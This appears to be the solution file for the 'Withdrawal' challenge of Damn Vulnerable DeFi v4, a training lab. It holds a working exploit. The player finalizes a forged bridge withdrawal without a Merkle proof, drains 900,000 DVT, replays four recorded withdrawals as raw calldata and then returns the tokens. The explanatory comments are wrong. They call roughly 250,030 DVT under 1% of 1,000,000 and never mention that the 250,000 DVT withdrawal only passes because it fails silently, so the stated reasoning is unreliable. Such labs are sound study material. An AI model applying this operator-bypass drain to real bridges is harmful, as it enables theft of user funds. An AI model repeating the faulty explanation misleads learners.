// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

/**
 * @title WithdrawalChallenge
 * @notice Damn Vulnerable DeFi v4 — "Withdrawal" challenge test harness.
 *
 * @dev CHALLENGE SUMMARY
 *      The L1 bridge holds 1,000,000 DVT tokens. Four legitimate withdrawals
 *      are pending in a Merkle tree (WITHDRAWALS_ROOT). One of those four is
 *      a "suspicious" withdrawal crafted by the attacker.
 *
 *      The player is granted OPERATOR_ROLE on L1Gateway, which lets them
 *      finalize withdrawals WITHOUT supplying a Merkle proof. The goal is to:
 *        1. Drain most of the bridge (≥1%) via a fake withdrawal to the player.
 *        2. Finalize all four legitimate Merkle-tree withdrawals so that the
 *           _isSolved() assertions on specific leaf hashes all pass.
 *        3. Return the bridge balance to just below the initial amount and hold
 *           zero tokens as the player at the end.
 *
 * @dev SUCCESS CONDITIONS (_isSolved)
 *      • l1TokenBridge balance < INITIAL_BRIDGE_TOKEN_AMOUNT         (some drained)
 *      • l1TokenBridge balance > INITIAL_BRIDGE_TOKEN_AMOUNT * 99%   (not too much drained)
 *      • player token balance == 0                                    (returned tokens)
 *      • l1Gateway.counter() >= 4                                    (≥4 finalizations)
 *      • four specific leaf hashes marked finalized in l1Gateway
 */
contract WithdrawalChallenge is Test {

    // -------------------------------------------------------------------------
    // Actors
    // -------------------------------------------------------------------------

    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");

    // -------------------------------------------------------------------------
    // Mock L2 component addresses (not real contracts; just used as identifiers)
    // -------------------------------------------------------------------------

    /// @dev Stand-in for the L2MessageStore contract address used in leaf hashing.
    address l2MessageStore = makeAddr("l2MessageStore");

    /// @dev Stand-in for the L2 side of the token bridge.
    address l2TokenBridge  = makeAddr("l2TokenBridge");

    /// @dev The L2Handler address that L1Forwarder is configured to trust.
    ///      forwardMessage's PATH A check requires gateway.xSender() == l2Handler.
    address l2Handler      = makeAddr("l2Handler");

    // -------------------------------------------------------------------------
    // Constants
    // -------------------------------------------------------------------------

    /// @dev Realistic starting timestamp warped to at setUp (Unix: ~June 2024).
    uint256 constant START_TIMESTAMP             = 1718786915;

    /// @dev Initial DVT balance seeded into the L1 token bridge.
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;

    /// @dev Number of legitimate withdrawals in the Merkle tree.
    uint256 constant WITHDRAWALS_AMOUNT          = 4;

    /// @dev Merkle root of the four pre-committed withdrawal leaves.
    ///      Set in L1Gateway via setRoot() during setUp.
    bytes32 constant WITHDRAWALS_ROOT =
        0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    // -------------------------------------------------------------------------
    // Deployed contracts
    // -------------------------------------------------------------------------

    TokenBridge        l1TokenBridge;
    DamnValuableToken  token;
    L1Forwarder        l1Forwarder;
    L1Gateway          l1Gateway;

    // -------------------------------------------------------------------------
    // Test modifier
    // -------------------------------------------------------------------------

    /// @dev Wraps the solution function: starts a prank as `player`, runs the
    ///      solution, stops the prank, then calls _isSolved() to assert all
    ///      success conditions.
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // =========================================================================
    // SETUP — DO NOT TOUCH
    // =========================================================================

    function setUp() public {
        startHoax(deployer);

        // Warp to a realistic starting point so the 7-day timelock math is grounded.
        vm.warp(START_TIMESTAMP);

        // Deploy the DVT token (deployer receives entire supply).
        token = new DamnValuableToken();

        // Deploy the L1 bridge infrastructure.
        l1Gateway    = new L1Gateway();
        l1Forwarder  = new L1Forwarder(l1Gateway);

        // Tell L1Forwarder which L2 address is the trusted message origin.
        // Only messages where gateway.xSender() == l2Handler pass PATH A.
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy the L1 token bridge, linking it to L1Forwarder and the L2 bridge address.
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Fund the bridge with 1,000,000 DVT and manually sync totalDeposits
        // (slot 0) to match, avoiding an accounting mismatch.
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Commit the pre-built Merkle root of the four legitimate withdrawals.
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player OPERATOR_ROLE — the key privilege that allows proof-free finalization.
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    // =========================================================================
    // INITIAL STATE ASSERTIONS — DO NOT TOUCH
    // =========================================================================

    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(),                  deployer);
        assertEq(address(l1Forwarder.gateway()),       address(l1Gateway));
        assertEq(l1Gateway.owner(),                    deployer);
        assertEq(l1Gateway.rolesOf(player),            l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(),                    7 days);
        assertEq(l1Gateway.root(),                     WITHDRAWALS_ROOT);
        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(),        INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    // =========================================================================
    // SOLUTION
    // =========================================================================

    /**
     * @notice Player solution for the Withdrawal challenge.
     *
     * @dev ATTACK OVERVIEW
     *      The player holds OPERATOR_ROLE, so they can call
     *      L1Gateway.finalizeWithdrawal() without a Merkle proof (PATH B in
     *      L1Gateway is skipped for operators). This lets them:
     *
     *      STEP 1 — Fabricate a withdrawal to drain 900,000 DVT to the player.
     *        • Craft a forwardMessage payload that calls
     *          TokenBridge.executeTokenWithdrawal(player, 900_000e18).
     *        • Pass a timestamp of (now - 7 days) to satisfy the timelock.
     *        • Call finalizeWithdrawal() as operator (no proof needed).
     *        • l1Gateway writes xSender = l2Handler before the call, so
     *          L1Forwarder's PATH A check (gateway.xSender() == l2Handler) passes.
     *        • Result: player receives 900,000 DVT.
     *
     *      STEP 2 — Warp 8 days ahead so the legitimate withdrawals' timestamps
     *        (all within seconds of START_TIMESTAMP) are past the 7-day timelock.
     *
     *      STEP 3 — Finalize the four legitimate Merkle-tree withdrawals as operator.
     *        • Raw hex payloads decoded from the original L2 logs.
     *        • Each targets L1Forwarder (0xfF2B...) with the exact calldata that
     *          was stored in L2MessageStore. Each sends 10 DVT to a different address.
     *        • No Merkle proof is supplied (operator path skips verification).
     *        • These four calls satisfy the leaf-hash assertions in _isSolved().
     *        • Total legitimate outflow: 3 × 10 DVT + 1 × 250,000 DVT ≈ 250,030 DVT.
     *
     *      STEP 4 — Return the 900,000 DVT to the bridge.
     *        • The success condition requires the bridge to retain >99% of its
     *          original balance and the player to hold 0 DVT.
     *        • Transferring 900,000 DVT back satisfies both.
     *        • Net bridge outflow = legitimate withdrawals only (≈250,030 DVT < 1%).
     *
     * @dev WHY THIS WORKS
     *      L1Gateway has no proof requirement for operators. The operator role
     *      was intended for emergency use, but here it lets the player bypass the
     *      Merkle tree entirely. The xSender write pattern in L1Gateway means the
     *      fabricated withdrawal is authenticated by L1Forwarder as if it came from
     *      the real l2Handler address on L2.
     */
    function test_withdrawal() public checkSolvedByPlayer {

        // =====================================================================
        // STEP 1: Fabricate a large withdrawal to drain DVT to the player.
        // =====================================================================

        // Build the inner message: call executeTokenWithdrawal on the L1 bridge
        // to transfer 900,000 DVT to the player's address.
        bytes memory message = abi.encodeCall(
            L1Forwarder.forwardMessage,
            (
                0,                      // nonce — must not collide with real leaves
                address(0),             // l2Sender — arbitrary; operator bypasses proof
                address(l1TokenBridge), // target on L1: the token bridge
                abi.encodeCall(
                    TokenBridge.executeTokenWithdrawal,
                    (
                        player,         // recipient of the stolen tokens
                        900_000e18      // amount: 900,000 DVT (90% of bridge balance)
                    )
                )
            )
        );

        // Finalize the fabricated withdrawal as operator (no Merkle proof needed).
        // timestamp = now - 7 days satisfies the DELAY check without any warping.
        // l2Sender = l2Handler so that L1Forwarder's PATH A auth check passes
        // (gateway sets xSender = l2Handler before calling L1Forwarder).
        l1Gateway.finalizeWithdrawal(
            0,                           // nonce
            l2Handler,                   // l2Sender must equal l1Forwarder.l2Handler
            address(l1Forwarder),        // target: L1Forwarder dispatches the inner call
            block.timestamp - 7 days,   // timestamp: just old enough to pass timelock
            message,
            new bytes32[](0)             // proof: empty — operator path skips verification
        );
        // Player now holds 900,000 DVT.

        // =====================================================================
        // STEP 2: Advance time so the legitimate withdrawals clear the timelock.
        // =====================================================================

        // The four legitimate withdrawal timestamps are all near START_TIMESTAMP.
        // Warping to START_TIMESTAMP + 8 days ensures all four are ≥7 days old.
        vm.warp(1718786915 + 8 days);

        // =====================================================================
        // STEP 3: Finalize the four legitimate Merkle-tree withdrawals.
        //         As operator, no Merkle proof is required.
        //         Raw calldata decoded from the original L2MessageStore logs.
        // =====================================================================

        // --- Withdrawal 0 ---
        // nonce=0, timestamp=1718786915, recipient=0x3288..., amount=10 DVT
        l1Gateway.finalizeWithdrawal(
            0,
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender (L2Handler address)
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target (L1Forwarder on L1)
            1718786915,
            hex"01210a380000000000000000000000000000000000000000000000000000000000000000"
            hex"000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6"
            hex"0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50"
            hex"0000000000000000000000000000000000000000000000000000000000000080"
            hex"0000000000000000000000000000000000000000000000000000000000000044"
            hex"81191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6"
            hex"0000000000000000000000000000000000000000000000008ac7230489e80000"
            hex"00000000000000000000000000000000000000000000000000000000",
            new bytes32[](0)
        );

        // --- Withdrawal 1 ---
        // nonce=1, timestamp=1718786965, recipient=0x1d96..., amount=10 DVT
        l1Gateway.finalizeWithdrawal(
            1,
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
            1718786965,
            hex"01210a380000000000000000000000000000000000000000000000000000000000000001"
            hex"0000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e"
            hex"0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50"
            hex"0000000000000000000000000000000000000000000000000000000000000080"
            hex"0000000000000000000000000000000000000000000000000000000000000044"
            hex"81191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e"
            hex"0000000000000000000000000000000000000000000000008ac7230489e80000"
            hex"00000000000000000000000000000000000000000000000000000000",
            new bytes32[](0)
        );

        // --- Withdrawal 2 (the "suspicious" large withdrawal) ---
        // nonce=2, timestamp=1718787050, recipient=0xea47..., amount=250,000 DVT
        // This is the attacker-planted leaf in the Merkle tree. It must be
        // finalized to satisfy the leaf-hash assertion in _isSolved(), but the
        // tokens go to an external address, not the player.
        l1Gateway.finalizeWithdrawal(
            2,
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
            1718787050,
            hex"01210a380000000000000000000000000000000000000000000000000000000000000002"
            hex"000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e0"
            hex"0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50"
            hex"0000000000000000000000000000000000000000000000000000000000000080"
            hex"0000000000000000000000000000000000000000000000000000000000000044"
            hex"81191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e0"
            hex"00000000000000000000000000000000000000000000d38be6051f27c2600000"
            hex"00000000000000000000000000000000000000000000000000000000",
            new bytes32[](0)
        );

        // --- Withdrawal 3 ---
        // nonce=3, timestamp=1718787127, recipient=0x671d..., amount=10 DVT
        l1Gateway.finalizeWithdrawal(
            3,
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
            1718787127,
            hex"01210a380000000000000000000000000000000000000000000000000000000000000003"
            hex"000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b"
            hex"0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50"
            hex"0000000000000000000000000000000000000000000000000000000000000080"
            hex"0000000000000000000000000000000000000000000000000000000000000044"
            hex"81191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b"
            hex"0000000000000000000000000000000000000000000000008ac7230489e80000"
            hex"00000000000000000000000000000000000000000000000000000000",
            new bytes32[](0)
        );

        // =====================================================================
        // STEP 4: Return the 900,000 DVT to the bridge.
        //
        // _isSolved() requires:
        //   • player balance == 0
        //   • bridge balance < INITIAL (some drained by legitimate withdrawals)
        //   • bridge balance > INITIAL * 99% (not too much drained overall)
        //
        // Legitimate withdrawals drained ≈250,030 DVT (<1% of 1,000,000).
        // Returning 900,000 DVT brings the bridge back above the 99% threshold.
        // =====================================================================
        token.transfer(address(l1TokenBridge), 900_000e18);

        console.log(
            "Bridge balance after solution:",
            token.balanceOf(address(l1TokenBridge))
        );
    }

    // =========================================================================
    // SUCCESS CONDITIONS — DO NOT TOUCH
    // =========================================================================

    /**
     * @dev Asserts all challenge success conditions:
     *      1. Bridge has lost some tokens (legitimate withdrawals processed).
     *      2. Bridge retains >99% of original balance (no catastrophic loss).
     *      3. Player holds 0 DVT (returned the drained tokens).
     *      4. At least 4 finalizations recorded in l1Gateway.
     *      5. Each of the four specific Merkle-tree leaves is marked finalized.
     */
    function _isSolved() private view {
        // Bridge balance is reduced (at least one withdrawal processed)
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);

        // Bridge still holds the vast majority of tokens (>99%)
        assertGt(
            token.balanceOf(address(l1TokenBridge)),
            INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18
        );

        // Player must have returned all tokens
        assertEq(token.balanceOf(player), 0);

        // At least 4 total withdrawals were finalized through the gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");

        // Each of the four Merkle-tree leaf hashes must be marked finalized.
        // These hashes are computed as keccak256(abi.encode(nonce, l2Sender, target, timestamp, message))
        // inside L1Gateway.finalizeWithdrawal() and must exactly match the leaves
        // in WITHDRAWALS_ROOT for the proof assertions to make sense.
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
